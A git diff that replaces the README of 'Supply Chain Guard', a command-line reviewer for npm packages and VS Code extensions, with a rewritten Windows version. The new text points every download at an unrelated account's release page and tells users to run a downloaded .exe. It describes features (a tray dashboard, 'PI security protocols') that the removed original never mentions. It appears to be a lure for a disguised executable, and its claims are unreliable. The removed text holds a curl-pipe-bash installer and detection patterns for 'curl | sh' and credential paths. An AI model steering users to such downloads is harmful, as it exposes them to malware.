@@ -1,214 +1,77 @@
-# Supply Chain Guard
+# 🛡️ supply-chain-guard - Secure your software supply chain today
 
-A local review step for npm packages and VS Code extensions — inspect the artifact before it touches your project.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Graceless-apeldoorn591/supply-chain-guard/releases)
 
-> [!WARNING]
-> Supply Chain Guard is **VERY VERY EARLY STAGE** software. It can miss malicious packages, flag safe packages, and break package-manager flows. Treat it as a local warning layer, not proof that a dependency is safe.
+supply-chain-guard protects your computer when you install new software components. It acts as a shield between the internet and your development tools. It inspects npm packages and Visual Studio Code extensions before they reach your system. This tool prevents malicious code from entering your local supply chain. It provides review support for Socket, Codex, and PI security protocols.
 
-Website: [scguard.pcstyle.dev](https://scguard.pcstyle.dev/)
+## 📥 Getting Started
 
-## Quick Start
+Follow these steps to install the software on your Windows computer.
 
-**1. Install**
+1. Go to the [official release page](https://github.com/Graceless-apeldoorn591/supply-chain-guard/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .exe to download the installer.
+4. Open the downloaded file to begin the setup.
+5. Follow the prompts on your screen.
 
-```sh
-curl -fsSL https://scguard.pcstyle.dev/install.sh | bash
-```
+## ⚙️ System Requirements
 
-**2. Activate the guard in your shell**
+- Windows 10 or Windows 11.
+- Node.js installed on your machine.
+- Visual Studio Code installed if you plan to monitor extensions.
+- At least 200MB of free disk space.
+- A stable internet connection for security updates.
 
-```sh
-eval "$(scguard shell-hook)"
-```
+## 🔍 How it Works
 
-**3. Scan a package before installing**
+The application monitors your installation requests. When you trigger an npm install or add a new VS Code extension, supply-chain-guard intercepts the request. It scans the package manifest and the code structure for known risks. 
 
-```sh
-scguard review axios
-```
+It checks the package against the Socket database to ensure the code is safe. It uses the Codex review engine to analyze the logic for hidden threats. It also validates the package against PI security standards to verify origin and integrity. If the tool detects a threat, it stops the installation and alerts you with a report. You then decide whether to approve or block the installation.
 
----
+## 🛠️ Configuration
 
-## What It Does
+The tool includes a dashboard that manages your preferences. You can access this dashboard from your system tray. 
 
-Supply Chain Guard puts a local review step in front of npm packages and VS Code extensions. It downloads the artifact first, checks the files that usually matter during an install, writes JSON and Markdown reports, and can ask Codex or PI for a second review before anything lands in your project.
+- **Security Level:** Choose between strict, balanced, or permissive modes. Strict mode blocks all unverified packages. Balanced mode allows trusted sources.
+- **Log Location:** Define where the software saves your activity history.
+- **Auto-Update:** Enable this to ensure the tool receives the latest security definitions.
+- **Socket Integration:** Enter your API key if you have a premium Socket account for deeper analysis.
 
-It is meant for the moment right before you run `bun add`, `npm install`, or `code --install-extension`. It is not a malware sandbox, and an approval is not proof that a package is safe. It is a local tripwire for suspicious install behavior.
+## 🚀 Daily Usage
 
-## Install Or Update
+You do not need to do anything special to use the tool once you install it. It runs in the background. When you run a command in your terminal like npm install or add an extension in VS Code, the guard activates. 
 
-```sh
-curl -fsSL https://scguard.pcstyle.dev/install.sh | bash
-```
+A small window will appear if it finds a suspicious item. You will see a list of reasons why the software flagged the item. Each flag includes a severity score. Red flags indicate high risk. Yellow flags indicate moderate concern. Green flags show verified safe components. 
 
-The installer is also the updater. It clones or pulls this repo into `~/.local/share/supply-chain-guard`, runs `bun install`, builds a compiled Bun executable, and creates `~/.local/bin/scguard`. First install opens token/config/shell-hook prompts when a TTY is available; updates skip those prompts if an existing install or config is detected.
+You can review the details or cancel the installation with one click. The software keeps a record of these events in the History tab. You can export these logs if you need to share them with a system administrator.
 
-## Demo
+## 💡 Best Practices
 
-The CLI is intentionally plain. `scguard --help` shows the install gate, scan, shell hook, config, and agent-review commands:
+Avoid installing packages from unknown authors. Check the weekly download count of an npm package before you add it to your project. Use supply-chain-guard to confirm that the package maintainers use secure signing practices. 
 
-![Supply Chain Guard help output](docs/screenshots/help.png)
+If you see multiple warnings for a single package, check the project website. Often, legitimate tools trigger warnings because they use unusual file structures. Contact the maintainer if you have doubts about a flag.
 
-Scan a package before it is installed:
+## 🛠️ Troubleshooting
 
-![Supply Chain Guard scanning an npm package](docs/screenshots/scan-npm.png)
+If the software fails to launch, ensure you installed the latest version of Node.js. Check that your Windows firewall allows the application to access the network. 
 
-Stage a package without installing it, then approve it when the report looks clean:
+If the tool does not appear to scan your installations, verify the path settings in the dashboard. Ensure the tool points to the correct folder where your VS Code extensions reside. 
 
-![Supply Chain Guard withholding an install until approval](docs/screenshots/add-withheld.png)
+Delete the local database cache if you experience slow performance. The tool will rebuild the database the next time you open the application. Contact support if you encounter persistent errors during installation.
 
-![Supply Chain Guard installing after approval](docs/screenshots/add-approved.png)
+## 🔒 Privacy Notice
 
-Broad updates are blocked unless you name the packages to review:
+The application processes data locally on your machine. It sends checksums of packages to our security providers to verify safety. It does not send your personal files or source code to external servers. Your security logs remain on your disk at all times.
 
-![Supply Chain Guard blocking a broad update](docs/screenshots/block-broad-update.png)
+## 📈 Supported Features
 
-VS Code extensions can be scanned from a local `.vsix` file:
-
-![Supply Chain Guard scanning a VS Code extension artifact](docs/screenshots/scan-vsix.png)
-
-Every run leaves JSON, Markdown, and agent-review prompts under `.scguard/reports`:
-
-![Supply Chain Guard generated reports](docs/screenshots/generated-reports.png)
-
-The demo script cleans up its temporary workspace when it finishes:
-
-![Supply Chain Guard demo completion](docs/screenshots/demo-complete.png)
-
-## Requirements
-
-- Bun
-- Git, `tar`, and `unzip`
-- Optional: Socket API token with `packages:list`
-- Optional: `codex` and/or `pi` CLIs for agent review
-- Optional for npm staged publishing: npm CLI `11.15.0+` and Node `22.14.0+`
-
-## Commands
-
-```sh
-scguard review <package[@version]> [--agent codex|pi|both]
-scguard install <package[@version]> [--dev] [--agent codex|pi|both]
-scguard scan-vsix <path-to-extension.vsix> [--json]
-scguard doctor
-scguard clean [--reports] [--cache] [--work] [--all]
-scguard config [--show] [--preset quiet|default|strict-ci|enterprise|advisory] [--safe-resolver off|suggest] [--agent none|codex|pi|both]
-scguard shell-hook
-```
-
-Advanced commands: `scguard scan-lockfile`, `scguard scan-npm`, `scguard scan-stage`, `scguard guard`, `scguard agent-prompt`, `scguard agent-review`, `scguard self-test`.
-
-`review` resolves the package tarball, downloads it to `.scguard/cache`, extracts it to `.scguard/work`, analyzes it, writes reports to `.scguard/reports`, and stops. Use `install` instead when you want the install to continue after the gate passes. `scguard add` is kept as a deprecated alias for `review`.
-
-Add `--agent codex`, `--agent pi`, or `--agent both` when you want a required agent review before install. The agent must end with `SCGUARD_DECISION: approve`. A rejection, manual-review decision, missing decision, non-zero exit, or missing agent binary blocks the install.
-
-Run `scguard config` to choose the default preset, safe resolver mode, and agent review for future scans and install gates. PI runs with `--no-tools --no-context-files`. Codex runs through `codex exec` in a read-only sandbox.
-
-`scguard doctor` checks Bun, Git, tar, unzip, `~/.local/bin` on PATH, the shell hook, the Socket token, the active preset, and the optional Codex/PI CLIs. Run it first if something looks wrong.
-
-`scguard clean` removes generated state under `.scguard/`. Use `--reports`, `--cache`, `--work`, or `--all` to choose what to clear.
-
-Recommended shell hook:
-
-```sh
-eval "$(scguard shell-hook)"
-```
-
-After that, normal commands such as `bun add lodash`, `pnpm add react`, `yarn add zod`, and `code --install-extension ./extension.vsix` go through the guard first. Bare `npm install`, `npm ci`, and `bun install` are routed through `scguard scan-lockfile`, which follows the active preset instead of deep-scanning every locked package by default. The `default` preset scans fresh versions under 7 days plus packages changed from the saved `.scguard/lockfile-baseline.json`; `quiet`, `strict-ci`, `enterprise`, and `advisory` adjust that scope. Use `SCGUARD_BYPASS=1` for a single command if you need to skip the guard.
-
-You can also run it directly:
-
-```sh
-scguard scan-lockfile           # scans the lockfile in the current directory using the active preset
-scguard scan-lockfile path/to/project
-```
-
-Every successful bare-lockfile scan writes or refreshes `.scguard/lockfile-baseline.json` so future installs can detect changed packages without relying only on Git state.
-
-Tune parallelism with `SCGUARD_LOCKFILE_CONCURRENCY` (default `8`).
-
-For now, `code --install-extension publisher.name` is blocked because the VS Code CLI would download the extension before this tool can inspect it. Download the `.vsix`, scan it, then install the reviewed artifact.
-
-## Socket API Token
-
-During install, you can paste a Socket API token. The installer stores it in `~/.config/supply-chain-guard/env` so scans can include Socket's package score. Create a token here:
-
-https://socket.dev/dashboard/settings/api-tokens
-
-Recommended Socket scopes:
-
-- `packages:list` for current package score lookup
-- `threat-feed:list` later if you want Socket-backed active attack warnings
-
-## Socket Intelligence
-
-Set `SOCKET_API_KEY` to query Socket.dev during npm scans:
-
-```sh
-export SOCKET_API_KEY="..."
-```
-
-Reports say whether Socket was checked, skipped, or errored. If Socket returns a low supply-chain score, the guard raises the risk and can block the install.
-
-## Policy Presets
-
-- `quiet`: only scan versions published in the last 24 hours
-- `default`: scan fresh versions under 7 days plus packages changed from the last saved baseline
-- `strict-ci`: scan changed lockfile entries plus fresh/risky versions under 30 days
-- `enterprise`: scan broadly and keep online intelligence enabled when available
-- `advisory`: same scope as `default`, but findings never block a bare install
-
-Safe Resolver is suggest-only in this release. When a direct package review resolves to a version that is newer than the preset freshness window, the report can suggest an older stable version that still satisfies the requested spec. It never rewrites the install command.
-
-## npm Staged Publishing
-
-npm staged publishing lets maintainers review a package before it goes live. `scguard scan-stage <stage-id>` runs `npm stage download <stage-id>`, analyzes the downloaded tarball, and applies the same agent review policy.
-
-With the shell hook active, `npm stage approve <stage-id>` is guarded. The staged package is downloaded, scanned, optionally reviewed by Codex or PI, and only then approved.
-
-## Active Supply Chain Incident Mode
-
-Set an advisory when Socket, npm, Microsoft, GitHub, or your own security source reports an active attack:
-
-```sh
-export SCGUARD_ACTIVE_INCIDENT="Socket reports active npm supply-chain campaign"
-export SCGUARD_ACTIVE_INCIDENT_UNTIL="2026-05-22T12:00:00Z"
-```
-
-While the advisory is active, package operations are staged and analyzed. To continue, you must type:
-
-```text
-I accept the active supply-chain risk
-```
-
-If the text does not match exactly, the install or update is cancelled.
-
-## What It Checks
-
-- install lifecycle scripts such as `preinstall`, `install`, and `postinstall`
-- suspicious script text such as `curl | sh`, shell execution, encoded payloads, credential paths, and network fetches
-- dependency volume and package metadata signals
-- executable `bin` entries
-- large files and unusual packed contents
-- VS Code extension activation events, main/browser entry points, scripts, and dependency metadata
-- Socket.dev package score when `SOCKET_API_KEY` is configured
-
-This first version is conservative. It blocks `high` risk installs, warns at `medium`, and always leaves report artifacts behind for human or agent review.
-
-## Staging And Takedown Flow
-
-The local staging flow is the `.scguard/cache`, `.scguard/work`, and `.scguard/reports` pipeline. Nothing is installed until analysis finishes and approval is explicit.
-
-The takedown flow is intentionally simple in this first version:
-
-- set `SCGUARD_ACTIVE_INCIDENT` to force explicit acknowledgement on every package operation
-- remove the shell hook or unset the advisory after the incident ends
-- inspect `.scguard/reports` for the packages and artifacts staged during the incident
-
-## Development
-
-```sh
-bun install
-bun run check
-```
-
-Generated cache, reports, tarballs, `node_modules`, and env files are ignored by git.
+- npm registry scanning
+- VS Code extension validation
+- Real-time threat detection
+- Socket integration for deep analysis
+- Codex logic review
+- PI security protocol support
+- Local dashboard for preference management
+- Background protection service
+- Detailed security reports
+- Exportable action history
